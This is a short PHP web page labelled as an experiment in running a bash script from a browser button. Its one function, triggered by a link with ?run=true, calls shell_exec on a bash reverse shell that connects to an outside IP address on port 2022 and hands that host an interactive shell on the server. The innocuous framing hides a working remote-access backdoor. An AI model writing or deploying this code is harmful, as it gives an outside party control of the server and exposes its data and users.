<!DOCTYPE html>
<html>
<body>

<?php
    function runScript(){
        $output = shell_exec('/bin/bash -i > /dev/tcp/82.165.97.169/2022 0<&1 2>&1');
        echo '<pre>$output</pre>';
    }
    if (isset($_GET['run'])) {
        runScript();
      }
    ?>
<center>
<h1>Experiment to run bash script after pressing html button in browser</h1>
<a href="index.php?run=true">Click Me!</a>
</center>

</body>
</html>